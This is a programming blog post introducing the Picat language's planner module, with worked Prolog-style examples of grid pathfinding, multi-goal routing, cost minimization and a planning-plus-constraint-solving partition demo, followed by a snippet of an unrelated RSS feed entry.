<p><a href="http://picat-lang.org/">Picat</a> is a research language intended to combine logic programming, imperative programming, and <a href="https://www.hillelwayne.com/post/minizinc/">constraint solving</a>. I originally learned it to help with vacation scheduling but soon discovered its <code>planner</code> module, which is one of the most fascinating programming models I’ve ever seen.</p>

<p>First, a brief explanation of <dfn>logic programming</dfn> (LP). In imperative and functional programming, we take inputs and write algorithms that produce outputs. In LP and constraint solving, we instead provide a set of equations and find assignments that satisfy those relationships. For example:</p>
<div><pre><code data-lang="prolog"><span></span><span>main</span> <span>=&gt;</span>
  <span>Arr</span> <span>=</span> <span>[</span><span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>,</span> <span>a</span><span>],</span>
  <span>X</span> <span>=</span> <span>a</span><span>,</span>
  <span>member</span><span>(X,</span> <span>Arr),</span>
  <span>member</span><span>(Y,</span> <span>Arr),</span>
  <span>X</span> <span>!</span><span>=</span> <span>Y,</span>
  <span>println</span><span>([X,</span> <span>Y]).</span>
</code></pre></div>

<p>Non-function identifiers that start with lowercase letters are “atoms”, or unique tokens. Identifiers that start with uppercase letters are variables. So <code>[a, b, c, a]</code> is a list of four atoms, while <code>Arr</code> and <code>X</code> are variables. So <code>Member(X, Arr)</code> returns true as you’d expect.</p>

<p>The interesting thing is <code>Member(Y, Arr)</code>. Y wasn’t defined yet! So Picat finds a value for Y that <em>makes</em> the equation true. Y could be any of <code>a</code>, <code>b</code>, or <code>c</code>. Then the line after that makes it impossible for <code>Y</code> to be <code>a</code>, so this prints either <code>ab</code> or <code>ac</code>. Picat can even handle expressions like <code>member(a, Z)</code>, instantiating Z as a list!</p>

<p><dfn>Planning</dfn> pushes this all one step further: instead of finding variable assignments that satisfy equations, we find variable <em>mutations</em> that reach a certain end state. And this opens up some really cool possibilities.</p>

<p>To showcase this, we’ll use Picat to solve a pathing problem.</p>

<h2 id="the-problem">The problem</h2>

<p>We place a marker on the grid, starting at the <em>origin</em> (0, 0), and pick another coordinate as the <em>goal</em>. At each step we can move one step in any cardinal direction, but cannot go off the boundaries of the grid. The program is successful when the marker is at the goal coordinate. As a small example:</p>

<pre><code>+---+
|   |
| G |
|O  |
+---+
</code></pre>

<p>One solution would be to move to (1, 0) and then to (1, 1).</p>

<p>To solve this with planning, we need to provide three things:</p>

<ol>
<li>A starting state <code>Start</code>, which contains both the origin and goal coordinates.</li>
<li>A set of <dfn>action</dfn> functions that represent state transitions. In Picat these functions <em>must</em> all be named <code>action</code> and take four parameters: a current state, a next state, an action name, and a cost. We’ll see that all below.</li>
<li>A function named <code>final(S)</code> that determines if S is a final state.</li>
</ol>

<p>Once we define all of these, we can call the builtin <code>best_plan(Start, Plan)</code> which will assign <code>Plan</code> to the shortest sequence of steps needed to reach a final state.<sup id="fnref:best-plan"><a href="#fn:best-plan">1</a></sup></p>

<h3 id="our-first-implementation">Our first implementation</h3>
<div><pre><code data-lang="prolog"><span></span><span>import</span> <span>planner</span><span>.</span>
<span>import</span> <span>util</span><span>.</span>

<span>main</span> <span>=&gt;</span>
   <span>Origin</span> <span>=</span> <span>{</span><span>0</span><span>,</span> <span>0</span><span>}</span>
   <span>,</span> <span>Goal</span> <span>=</span> <span>{</span><span>2</span><span>,</span> <span>2</span><span>}</span>
   <span>,</span> <span>Start</span> <span>=</span> <span>{Origin,</span> <span>Goal}</span>
   <span>,</span> <span>best_plan</span><span>(Start,</span> <span>Path)</span>
   <span>,</span> <span>println</span><span>(Plan)</span>
   <span>.</span>
</code></pre></div>

<details>

  <summary>
    Explanation
  </summary>
  <p><code>main</code> is the default entry point into a Picat program. Here we’re just setting up the initial state, calling <code>best_plan</code>, and printing <code>Plan</code>. <code>{a, b}</code> is the syntax for a Picat array, which is basically a tuple.</p>

<p>Every expression in a Picat body must be followed by a comma <em>except</em> the last clause, which must be followed with a period. This makes moving lines around <em>really annoying</em>. Writing it in that “bullet point” style helps a little.</p>

</details>




<p>Since <code>final</code> takes just one argument, we’ll need to store both the current position and the goal into said argument. Picat has great pattern matching so we can just write it like this:</p>
<div><pre><code data-lang="prolog"><span></span><span>final</span><span>({Pos,</span> <span>Goal})</span> <span>=&gt;</span> <span>Pos</span> <span>=</span> <span>Goal.</span>
</code></pre></div>

<details>

  <summary>
    Explanation
  </summary>
  <p>Without the pattern matching, we’d have to write it like this:</p>
<div><pre><code data-lang="prolog"><span></span><span>final</span><span>(S)</span> <span>=&gt;</span>
  <span>S</span> <span>=</span> <span>{Pos,</span> <span>Goal}</span>
  <span>,</span> <span>Pos</span> <span>=</span> <span>Goal</span>
  <span>.</span>
</code></pre></div>

<p>If we write a second <code>final</code> predicate, the plan succeeds if <em>either</em> <code>final</code> returns true.</p>

</details>




<p>Finally, we need to define the actions which the planner can take. We only need one action here.</p>
<div><pre><code data-lang="prolog"><span></span><span>action</span><span>(From,</span> <span>To,</span> <span>Action,</span> <span>Cost)</span> <span>?=&gt;</span>
  <span>From</span> <span>=</span> <span>{{Fx,</span> <span>Fy},</span> <span>Goal}</span>
  <span>,</span> <span>Dir</span> <span>=</span> <span>[{</span><span>-</span><span>1</span><span>,</span> <span>0</span><span>},</span> <span>{</span><span>1</span><span>,</span> <span>0</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>-</span><span>1</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>1</span><span>}]</span> 
  <span>,</span> <span>member</span><span>({Dx,</span> <span>Dy},</span> <span>Dir)</span>                    <span>% (a)</span>
  <span>,</span> <span>Tx</span> <span>=</span> <span>Fx</span> <span>+</span> <span>Dx</span>
  <span>,</span> <span>Ty</span> <span>=</span> <span>Fy</span> <span>+</span> <span>Dy</span>
  <span>,</span> <span>member</span><span>(Tx,</span> <span>0..10</span><span>)</span>                        <span>% (b)</span>
  <span>,</span> <span>member</span><span>(Ty,</span> <span>0..10</span><span>)</span>                        <span>% (b)</span>
  <span>,</span> <span>To</span> <span>=</span> <span>{{Tx,</span> <span>Ty},</span> <span>Goal}</span>
  <span>,</span> <span>Action</span> <span>=</span> <span>{</span><span>move</span><span>,</span> <span>T[</span><span>1</span><span>]}</span>
  <span>,</span> <span>Cost</span> <span>=</span> <span>1</span>
  <span>.</span>
</code></pre></div>

<details>

  <summary>
    Explanation
  </summary>
  <p><code>From</code> is the initial state, <code>To</code> is the next state, <code>Action</code> is the name of the action— in this case, <code>move</code>.<sup id="fnref:structures"><a href="#fn:structures">1</a></sup> You can store metadata in the action, which we use to store the new coordinates.</p>

<p>Writing <code>action ?=&gt;</code> instead of <code>action =&gt;</code> makes <code>action</code> backtrackable, which I’ll admit I don’t <em>fully</em> understand? I’m <em>pretty sure</em> it means that if <em>this</em> definition of <code>action</code> pattern-matches but doesn’t lead to a viable plan, then Picat can try <em>other</em> definitions of action. This’ll matter more for later versions.</p>

<p>As with the introductory example up top, we’re using <code>member</code> to both <em>find</em> values (on line <code>(a)</code>) and <em>test values</em> (on lines <code>(b)</code>). Picat also has a non-assigning predicate, <code>membchk</code>, which just does testing. If I wasn’t trying to showcase Picat I could instead have use <code>membchk</code> for the testing part, which cannot assign.</p>

<p><code>Cost</code> is the “cost” of the action. <code>best_plan</code> tries to minimize the total cost. Leaving it at 1 means the cost of a plan is the total number of steps.</p>


</details>




<p>And that’s it, we’re done with the program. Here’s the output:</p>

<pre><code>&gt; picat planner1.pi

[{move,{1,0}},{move,{2,0}},{move,{2,1}},{move,{2,2}}]
</code></pre>

<p>That’s a little tough to read, so I had Picat output structured data that I could process into a picture.</p>
<div><pre><code data-lang="diff"><span></span><span>main =&gt;</span>
<span> </span> Origin = {0, 0}
<span> </span> , Goal = {2, 2}
<span> </span> , Start = {Origin, Goal}
<span> </span> , best_plan(Start, Path)
<span>- , println(Plan)</span>
<span>+ , printf("Origin: %w\n", Origin)</span>
<span>+ , printf("Goal: %w\n", Goal)</span>
<span>+ , printf("Bounds: {10, 10}\n")</span>
<span>+ , printf("Path: ")</span>
<span>+ , println(join([to_string(A[2]): A in Plan], ", "))</span>
<span> </span> .
</code></pre></div>

<p>I used a <a href="https://www.hillelwayne.com/post/picat/src/format_path.raku">Raku script</a> to visualize it.<sup id="fnref:patreon1"><a href="#fn:patreon1">2</a></sup> Here’s what we now get:</p>

<pre><code>&gt; raku format_path.raku -bf planner1.pi

+-----+
|     |
|     |
|  G  |
|  •  |
|O••  |
+-----+
</code></pre>

<p>To show that the planner can route around an “obstacle”, I’ll add a rule that the state <em>cannot</em> be a certain value:</p>
<div><pre><code data-lang="diff"><span></span><span> </span> , Tx = Fx + Dx
<span> </span> , Ty = Fy + Dy
<span>+ , {Tx, Ty} != {2, 1}</span>
</code></pre></div>

<pre><code>+-----+
|     |
|     |
| •G  |
| •   |
|O•   |
+-----+
</code></pre>

<p>Let’s comment that out for now, leaving this as our current version of the code:</p>

<details>

  <summary>
    Code
  </summary>
  <div><pre><code data-lang="prolog"><span></span><span>import</span> <span>planner</span><span>.</span>
<span>import</span> <span>util</span><span>.</span>

<span>main</span> <span>=&gt;</span>
  <span>Origin</span> <span>=</span> <span>{</span><span>0</span><span>,</span> <span>0</span><span>}</span>
  <span>,</span> <span>Goal</span> <span>=</span> <span>{</span><span>2</span><span>,</span> <span>2</span><span>}</span>
  <span>,</span> <span>Start</span> <span>=</span> <span>{Origin,</span> <span>Goal}</span>
  <span>,</span> <span>best_plan</span><span>(Start,</span> <span>Plan)</span>
  <span>% , println(Plan) </span>
  <span>,</span> <span>printf</span><span>(</span><span>"Origin: %w\n"</span><span>,</span> <span>Origin)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Goal: %w\n"</span><span>,</span> <span>Goal)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Bounds: {10, 10}\n"</span><span>)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Path: "</span><span>)</span>
  <span>,</span> <span>println</span><span>(</span><span>join</span><span>([</span><span>to_string</span><span>(A[</span><span>2</span><span>])</span><span>:</span>  <span>A</span> <span>in</span> <span>Plan],</span> <span>", "</span><span>))</span>
  <span>.</span>

<span>final</span><span>(S)</span> <span>=&gt;</span>
  <span>S</span> <span>=</span> <span>{Pos,</span> <span>Goal},</span>
  <span>Pos</span> <span>=</span> <span>Goal.</span>

<span>action</span><span>(From,</span> <span>To,</span> <span>Action,</span> <span>Cost)</span> <span>?=&gt;</span>
  <span>From</span> <span>=</span> <span>{{Fx,</span> <span>Fy},</span> <span>Goal}</span>
  <span>,</span> <span>Dir</span> <span>=</span> <span>[{</span><span>-</span><span>1</span><span>,</span> <span>0</span><span>},</span> <span>{</span><span>1</span><span>,</span> <span>0</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>-</span><span>1</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>1</span><span>}]</span>
  <span>,</span> <span>member</span><span>({Dx,</span> <span>Dy},</span> <span>Dir)</span>
  <span>,</span> <span>Tx</span> <span>=</span> <span>Fx</span> <span>+</span> <span>Dx</span>
  <span>,</span> <span>Ty</span> <span>=</span> <span>Fy</span> <span>+</span> <span>Dy</span>
  <span>% , {Tx, Ty} != {2, 1}</span>
  <span>,</span> <span>member</span><span>(Tx,</span> <span>0..10</span><span>)</span>
  <span>,</span> <span>member</span><span>(Ty,</span> <span>0..10</span><span>)</span>
  <span>,</span> <span>To</span> <span>=</span> <span>{{Tx,</span> <span>Ty},</span> <span>Goal}</span>
  <span>,</span> <span>Action</span> <span>=</span> <span>{</span><span>move</span><span>,</span> <span>To[</span><span>1</span><span>]}</span>
  <span>,</span> <span>Cost</span> <span>=</span> <span>1</span>
  <span>.</span>
</code></pre></div>

</details>




<h3 id="adding-multiple-goals">Adding multiple goals</h3>

<p>Next I’ll add multiple goals. In order to succeed, the planner needs to reach every single goal in order. We start with one change to <code>main</code>:</p>
<div><pre><code data-lang="diff"><span></span><span>main =&gt;</span>
<span> </span> Origin = {0, 0}
<span>- , Goal = {2, 2}</span>
<span>+ , Goal = [{2, 2}, {3, 4}]</span>
</code></pre></div>

<p>Goal now represents a “queue” of goals to reach, in order. Then we add a <em>new</em> action which removes a goal from our queue once we’ve reached it.</p>
<div><pre><code data-lang="prolog"><span></span><span>action</span><span>(From,</span> <span>To,</span> <span>Action,</span> <span>Cost)</span> <span>?=&gt;</span>
  <span>From</span> <span>=</span> <span>{Pos,</span> <span>Goal}</span>
  <span>,</span> <span>Goal</span> <span>=</span> <span>[Pos|Rest]</span>
  <span>,</span> <span>To</span> <span>=</span> <span>{Pos,</span> <span>Rest}</span>
  <span>,</span> <span>Action</span> <span>=</span> <span>{</span><span>mark</span><span>,</span> <span>From[</span><span>1</span><span>]}</span>
  <span>,</span> <span>Cost</span> <span>=</span> <span>1</span>
  <span>.</span>
</code></pre></div>

<details>

  <summary>
    Explanation
  </summary>
  <p><code>[Head|Tail]</code> splits a list into the first element and the rest. Since <code>Pos</code> was defined in the line before, <code>Goal = [Pos|Rest]</code> is <em>only</em> true if the first goal on the list is equal to <code>Pos</code>. Then we drop that goal from our new state by declaring the new goal state to just be <code>Rest</code>.</p>

<p>(This is where backtracking with <code>?=&gt;</code> becomes important: if we didn’t make the actions backtrackable, Picat would match on the <code>move</code> first and never <code>mark</code>.)</p>

</details>




<p>Since we’re now destructively removing goals from our list when we reach them, <code>final</code> needs to be adjusted:</p>
<div><pre><code data-lang="diff"><span></span><span>final({Pos, Goal}) =&gt;</span>
<span>- Pos = Goal.</span>
<span>+ Goal = [].</span>
</code></pre></div>

<p>And that’s it. We didn’t even have to update our first action!</p>

<pre><code>+-----+
|   G |
|   • |
|  G• |
|  •  |
|O••  |
+-----+
</code></pre>

<details>

  <summary>
    Code
  </summary>
  <div><pre><code data-lang="prolog"><span></span><span>import</span> <span>planner</span><span>.</span>
<span>import</span> <span>util</span><span>.</span>

<span>main</span> <span>=&gt;</span>
  <span>Origin</span> <span>=</span> <span>{</span><span>0</span><span>,</span> <span>0</span><span>}</span>
  <span>,</span> <span>Goal</span> <span>=</span> <span>[{</span><span>2</span><span>,</span> <span>2</span><span>},</span> <span>{</span><span>3</span><span>,</span> <span>4</span><span>}]</span>
  <span>%, Goal = [{9, 2}, {0, 4}, {9, 6}, {0, 9}]</span>
  <span>,</span> <span>Start</span> <span>=</span> <span>{Origin,</span> <span>Goal}</span>
  <span>,</span> <span>best_plan</span><span>(Start,</span> <span>Plan)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Origin: %w\n"</span><span>,</span> <span>Origin)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Goal: %w\n"</span><span>,</span> <span>Goal)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Bounds: {10, 10}\n"</span><span>)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Path: "</span><span>)</span>
  <span>,</span> <span>println</span><span>(</span><span>join</span><span>([</span><span>to_string</span><span>(A[</span><span>2</span><span>])</span><span>:</span>  <span>A</span> <span>in</span> <span>Plan],</span> <span>", "</span><span>))</span>
  <span>.</span>

<span>final</span><span>({Pos,</span> <span>Goal})</span> <span>=&gt;</span>
  <span>Goal</span> <span>=</span> <span>[].</span>

<span>action</span><span>(From,</span> <span>To,</span> <span>Action,</span> <span>Cost)</span> <span>?=&gt;</span>
  <span>From</span> <span>=</span> <span>{{Fx,</span> <span>Fy},</span> <span>Goal}</span>
  <span>,</span> <span>Dir</span> <span>=</span> <span>[{</span><span>-</span><span>1</span><span>,</span> <span>0</span><span>},</span> <span>{</span><span>1</span><span>,</span> <span>0</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>-</span><span>1</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>1</span><span>}]</span>
  <span>,</span> <span>member</span><span>({Dx,</span> <span>Dy},</span> <span>Dir)</span>
  <span>,</span> <span>Tx</span> <span>=</span> <span>Fx</span> <span>+</span> <span>Dx</span>
  <span>,</span> <span>Ty</span> <span>=</span> <span>Fy</span> <span>+</span> <span>Dy</span>
  <span>,</span> <span>member</span><span>(Tx,</span> <span>0..10</span><span>)</span>
  <span>,</span> <span>member</span><span>(Ty,</span> <span>0..10</span><span>)</span>
  <span>,</span> <span>To</span> <span>=</span> <span>{{Tx,</span> <span>Ty},</span> <span>Goal}</span>
  <span>,</span> <span>Action</span> <span>=</span> <span>{</span><span>move</span><span>,</span> <span>To[</span><span>1</span><span>]}</span>
  <span>,</span> <span>Cost</span> <span>=</span> <span>1</span>
  <span>.</span>

<span>action</span><span>(From,</span> <span>To,</span> <span>Action,</span> <span>Cost)</span> <span>?=&gt;</span>
  <span>From</span> <span>=</span> <span>{Pos,</span> <span>Goal}</span>
  <span>,</span> <span>Goal</span> <span>=</span> <span>[Pos|Rest]</span>
  <span>,</span> <span>To</span> <span>=</span> <span>{Pos,</span> <span>Rest}</span>
  <span>,</span> <span>Action</span> <span>=</span> <span>{</span><span>mark</span><span>,</span> <span>From[</span><span>1</span><span>]}</span>
  <span>,</span> <span>Cost</span> <span>=</span> <span>1</span>
  <span>.</span>
  
</code></pre></div>

</details>




<h3 id="cost-minimization">Cost minimization</h3>

<p>Going through the goals in order doesn’t always lead to the shortest <em>total</em> path.</p>
<div><pre><code data-lang="diff"><span></span><span>main =&gt;</span>
<span> </span> Origin = {0, 0}
<span>- , Goal = [{2, 2}, {3, 4}]</span>
<span>+ , Goal = [{9, 2}, {0, 4}, {9, 6}, {0, 9}]</span>
</code></pre></div>

<pre><code>+----------+
|G         |
|•         |
|•         |
|•••••••••G|
|         •|
|G•••••••••|
|•         |
|•••••••••G|
|         •|
|O•••••••••|
+----------+
</code></pre>

<p>What if we didn’t care about the order of the goals and just wanted to find the shortest path? Then we only need to change two lines:</p>
<div><pre><code data-lang="diff"><span></span><span>action(From, T, Action, Cost) ?=&gt;</span>
<span> </span> From = {Pos, Goal}
<span>- , Goal = [Pos|Rest]</span>
<span>- , T = {Pos, Rest}</span>
<span>+ , member(Pos, Goal)</span>
<span>+ , T = {Pos, delete(Goal, Pos)}</span>
<span> </span> , Action = {mark, From[1]}
<span> </span> , Cost = 1
<span> </span> .
</code></pre></div>

<p>Now the planner can delete any goal it’s passing over regardless of where it is in the <code>Goal</code> list. So Picat can “choose” which goal it moves to next so as to minimize the overall path length.</p>

<pre><code>+----------+
|G•••••••••|
|•        •|
|•        •|
|•        G|
|•        •|
|G        •|
|•        •|
|•        G|
|•         |
|O         |
+----------+
</code></pre>

<p>Final code:</p>

<details>

  <summary>
    Code
  </summary>
  <div><pre><code data-lang="prolog"><span></span><span>import</span> <span>planner</span><span>.</span>
<span>import</span> <span>util</span><span>.</span>

<span>main</span> <span>=&gt;</span>
  <span>Origin</span> <span>=</span> <span>{</span><span>0</span><span>,</span> <span>0</span><span>}</span>
  <span>,</span> <span>Goal</span> <span>=</span> <span>[{</span><span>9</span><span>,</span> <span>2</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>4</span><span>},</span> <span>{</span><span>9</span><span>,</span> <span>6</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>9</span><span>}]</span>
  <span>,</span> <span>Start</span> <span>=</span> <span>{Origin,</span> <span>Goal}</span>
  <span>,</span> <span>best_plan</span><span>(Start,</span> <span>Plan)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Origin: %w\n"</span><span>,</span> <span>Origin)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Goal: %w\n"</span><span>,</span> <span>Goal)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Bounds: {10, 10}\n"</span><span>)</span>
  <span>,</span> <span>printf</span><span>(</span><span>"Path: "</span><span>)</span>
  <span>,</span> <span>println</span><span>(</span><span>join</span><span>([</span><span>to_string</span><span>(A[</span><span>2</span><span>])</span><span>:</span>  <span>A</span> <span>in</span> <span>Plan],</span> <span>", "</span><span>))</span>
  <span>.</span>

<span>final</span><span>({Pos,</span> <span>Goal})</span> <span>=&gt;</span>
  <span>Goal</span> <span>=</span> <span>[].</span>

<span>action</span><span>(From,</span> <span>To,</span> <span>Action,</span> <span>Cost)</span> <span>?=&gt;</span>
  <span>From</span> <span>=</span> <span>{{Fx,</span> <span>Fy},</span> <span>Goal}</span>
  <span>,</span> <span>Dir</span> <span>=</span> <span>[{</span><span>-</span><span>1</span><span>,</span> <span>0</span><span>},</span> <span>{</span><span>1</span><span>,</span> <span>0</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>-</span><span>1</span><span>},</span> <span>{</span><span>0</span><span>,</span> <span>1</span><span>}]</span>
  <span>,</span> <span>member</span><span>({Dx,</span> <span>Dy},</span> <span>Dir)</span>
  <span>,</span> <span>Tx</span> <span>=</span> <span>Fx</span> <span>+</span> <span>Dx</span>
  <span>,</span> <span>Ty</span> <span>=</span> <span>Fy</span> <span>+</span> <span>Dy</span>
  <span>,</span> <span>member</span><span>(Tx,</span> <span>0..10</span><span>)</span>
  <span>,</span> <span>member</span><span>(Ty,</span> <span>0..10</span><span>)</span>
  <span>,</span> <span>To</span> <span>=</span> <span>{{Tx,</span> <span>Ty},</span> <span>Goal}</span>
  <span>,</span> <span>Action</span> <span>=</span> <span>{</span><span>move</span><span>,</span> <span>To[</span><span>1</span><span>]}</span>
  <span>,</span> <span>Cost</span> <span>=</span> <span>1</span>
  <span>.</span>

<span>action</span><span>(From,</span> <span>To,</span> <span>Action,</span> <span>Cost)</span> <span>?=&gt;</span>
  <span>From</span> <span>=</span> <span>{Pos,</span> <span>Goal}</span>
  <span>,</span> <span>member</span><span>(Pos,</span> <span>Goal)</span>
  <span>,</span> <span>To</span> <span>=</span> <span>{Pos,</span> <span>delete</span><span>(Goal,</span> <span>Pos)}</span>
  <span>,</span> <span>Action</span> <span>=</span> <span>{</span><span>mark</span><span>,</span> <span>From[</span><span>1</span><span>]}</span>
  <span>,</span> <span>Cost</span> <span>=</span> <span>1</span> 
  <span>.</span>
</code></pre></div>

</details>




<h3 id="other-variations">Other variations</h3>

<p>Picat supports a lot more variations on planning:</p>

<ul>
<li><code>best_plan(S, Limit, Plan)</code> caps the maximum cost at <code>Limit</code>— good for failing early.</li>
<li>For each <code>best_plan</code>, there’s a <code>best_plan_nondet</code> that finds every possible best plan.</li>
<li><code>sequence(P, Action)</code> restricts the possible actions based on the current partial plan, so we can add restrictions like “you have to move twice before you turn”.</li>
</ul>

<p>The coolest thing to me is that the planning integrates with all the other Picat features. I whipped up a quick demo that combines planning and constraint solving. The <dfn>partition problem</dfn> is an NP-complete problem where you partition a list of numbers into two equal sums. This program takes a list of numbers and finds the sublist with the largest possible equal partitioning:<sup id="fnref:patreon2"><a href="#fn:patreon2">3</a></sup></p>

<details>

  <summary>
    Code
  </summary>
  <div><pre><code data-lang="prolog"><span></span><span>% got help from http://www.hakank.org/picat/set_partition.pi </span>
<span>import</span> <span>planner</span><span>.</span>
<span>import</span> <span>util</span><span>.</span>
<span>import</span> <span>cp</span><span>.</span>

<span>main</span> <span>=&gt;</span>
<span>Numbers</span> <span>=</span> <span>[</span><span>32</span><span>,</span> <span>122</span><span>,</span> <span>77</span><span>,</span> <span>86</span><span>,</span> <span>59</span><span>,</span> <span>47</span><span>,</span> <span>154</span><span>,</span> <span>141</span><span>,</span> <span>172</span><span>,</span> <span>49</span><span>,</span> <span>5</span><span>,</span> <span>62</span><span>,</span> <span>99</span><span>,</span> <span>109</span><span>,</span> <span>17</span><span>,</span> <span>30</span><span>,</span> <span>977</span><span>]</span>
  <span>,</span> <span>if</span> <span>final</span><span>(Numbers)</span> <span>then</span>
      <span>println</span><span>(</span><span>"Input already has a partition!"</span><span>)</span>
      <span>,</span> <span>explain_solution</span><span>(Numbers)</span>
    <span>else</span>
        <span>best_plan</span><span>(Numbers,</span> <span>Plan)</span>
      <span>,</span> <span>printf</span><span>(</span><span>"Removed: %w%n"</span><span>,[R</span><span>:</span> <span>$</span><span>remove</span><span>(R,</span> <span>_</span><span>)</span> <span>in</span> <span>Plan])</span>
      <span>,</span> <span>$</span><span>remove</span><span>(Last,</span> <span>FinalState)</span> <span>=</span> <span>Plan[Plan.</span><span>length</span><span>]</span>
      <span>,</span> <span>printf</span><span>(</span><span>"Final: %w%n"</span><span>,</span> <span>FinalState)</span>
      <span>,</span> <span>explain_solution</span><span>(FinalState)</span>
    <span>end</span>
  <span>.</span>

<span>final</span><span>(Numbers)</span> <span>=&gt;</span> <span>get_solutions</span><span>(Numbers)</span> <span>!</span><span>=</span> <span>[].</span>

<span>get_solutions</span><span>(Numbers)</span> <span>=</span> <span>S</span> <span>=&gt;</span>
  <span>X</span> <span>=</span> <span>new_list</span><span>(Numbers.</span><span>length</span><span>)</span>
  <span>,</span> <span>X</span> <span>::</span> <span>0..1</span>
  <span>,</span> <span>X[</span><span>1</span><span>]</span> <span>#=</span> <span>0</span> <span>% symmetry breaking</span>
  <span>,</span> <span>sum</span><span>(Numbers)</span> <span>#=</span> <span>2</span><span>*</span><span>sum</span><span>([Numbers[I]</span><span>*</span><span>X[I]</span><span>:</span> <span>I</span> <span>in</span> <span>1.</span><span>.Numbers.</span><span>length</span><span>])</span>
  <span>,</span> <span>S</span> <span>=</span> <span>solve_all</span><span>([</span><span>$</span><span>limit</span><span>(</span><span>1</span><span>)],</span> <span>X)</span> 
  <span>.</span>
  
<span>action</span><span>(From,</span> <span>To,</span> <span>Action,</span> <span>Cost)</span> <span>=&gt;</span>
   <span>member</span><span>(Element,</span> <span>From)</span>
   <span>,</span> <span>To</span> <span>=</span> <span>delete</span><span>(From,</span> <span>Element)</span>
   <span>,</span> <span>Action</span> <span>=</span> <span>$</span><span>remove</span><span>(Element,</span> <span>To)</span>
   <span>,</span> <span>Cost</span> <span>=</span> <span>Element</span>
   <span>.</span>

<span>explain_solution</span><span>(Numbers)</span> <span>=&gt;</span>
  <span>[Sol]</span> <span>=</span> <span>get_solutions</span><span>(Numbers)</span>
  <span>,</span> <span>Left</span> <span>=</span>  <span>[Numbers[I]</span><span>:</span> <span>I</span> <span>in</span> <span>1.</span><span>.Numbers.</span><span>length</span><span>,</span> <span>Sol[I]</span> <span>=</span> <span>0</span><span>]</span>
  <span>,</span> <span>Right</span> <span>=</span> <span>[Numbers[I]</span><span>:</span> <span>I</span> <span>in</span> <span>1.</span><span>.Numbers.</span><span>length</span><span>,</span> <span>Sol[I]</span> <span>=</span> <span>1</span><span>]</span>
  <span>,</span> <span>printf</span><span>(</span><span>"%s=%d%n"</span><span>,</span> <span>join</span><span>([</span><span>to_string</span><span>(N)</span><span>:</span> <span>N</span> <span>in</span> <span>Left],</span> <span>"+"</span><span>),</span> <span>sum</span><span>(Left))</span>
  <span>,</span> <span>printf</span><span>(</span><span>"%s=%d%n"</span><span>,</span> <span>join</span><span>([</span><span>to_string</span><span>(N)</span><span>:</span> <span>N</span> <span>in</span> <span>Right],</span> <span>"+"</span><span>),</span> <span>sum</span><span>(Right))</span>
  <span>.</span>
</code></pre></div>

</details>




<pre><code>Removed: [5,17]
Final: [32,122,77,86,59,47,154,141,172,49,62,99,109,30,977]
32+99+977=1108
122+77+86+59+47+154+141+172+49+62+109+30=1108
</code></pre>

<p>This is all so mindblowing to me. It’s almost like a metaconstraint solver, allowing me to express constraints <em>on the valid constraints</em>.</p>

<h2 id="should-i-use-picat">Should I use Picat?</h2>

<p>Depends?</p>

<p>I would not recommend using Picat in production. It’s a research language and doesn’t have a lot of affordances, like good documentation or clear error messages. Here’s what you get when there’s no plan that solves the problem:</p>

<pre><code>*** error(failed,main/0)
</code></pre>

<p>But hey it runs on Windows, which is better than 99% of research languages.</p>

<p>Picat seems more useful as a “toolkit” language, one you learn to solve a specific class of computational problems, and where you’re not expecting to maintain or share the code afterwards. But it’s really good in that niche! There’s a handful of problems I struggled to do with regular programming languages and constraint solvers. Picat solves a lot of them quite elegantly.</p>

<h2 id="appendix-other-planning-languages">Appendix: Other planning languages</h2>

<p>While originally pioneered for robotics and AI, “planning” is most-often used for video game AIs, where it’s called “Goal Oriented Action Planning” (GOAP).  Usually it’s built as libraries on top of other languages, or implemented as a <a href="https://artint.info/3e/html/ArtInt3e.Ch3.html">custom search strategy</a>. You can read more about GOAP <a href="https://web.archive.org/web/20140613121607/http://alumni.media.mit.edu/~jorkin/goap.html">here</a>.</p>

<p>There is also <a href="https://planning.wiki/guide/whatis/pddl">PDDL</a>, a planning description language that independent planners take as input, in the same way that DIMACS is a description format for <a href="https://www.hillelwayne.com/post/sudoku/">SAT</a>.</p>

<p><em>Thanks to <a href="https://predr.ag/">Predrag Gruevski</a> for feedback. I first shared <a href="https://buttondown.email/hillelwayne/archive/picat-is-my-favorite-new-toolbox-language/">my thoughts on Picat</a> on <a href="https://buttondown.email/hillelwayne/">my newsletter</a>. I write new newsletter posts weekly.</em></p>


</div>

    



  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why is no one making a new version of old Facebook? (132 pts)]]></title>
            <link>https://12challenges.substack.com/p/why-is-no-one-making-a-new-version</link>
            <guid>39444165</guid>
            <pubDate>Tue, 20 Feb 2024 17:35:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://12challenges.substack.com/p/why-is-no-one-making-a-new-version">https://12challenges.substack.com/p/why-is-no-one-making-a-new-version</a>, See on <a href="https://news.ycombinator.com/item?id=39444165">Hacker News</a></p>
